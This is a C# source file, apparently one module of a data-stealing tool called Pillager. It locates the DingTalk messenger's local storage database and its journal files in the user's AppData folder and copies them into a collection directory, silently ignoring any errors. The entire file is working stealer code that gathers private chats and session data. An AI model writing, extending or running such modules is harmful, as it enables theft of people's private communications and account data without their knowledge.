﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace Pillager.Messengers
{
    internal class DingTalk
    {
        public static string MessengerName = "DingTalk";

        public static void Save(string path)
        {
            try
            {
                string storagepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db");
                if (!File.Exists(storagepath)) return;
                string storageshmpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-shm");
                string storagewalpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-wal");
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                File.Copy(storagepath, Path.Combine(savepath, "storage.db"));
                if (File.Exists(storageshmpath))
                    File.Copy(storageshmpath, Path.Combine(savepath, "storage.db-shm"));
                if (File.Exists(storagewalpath))
                    File.Copy(storagewalpath, Path.Combine(savepath, "storage.db-wal"));
            }
            catch { }
        }
    }
}
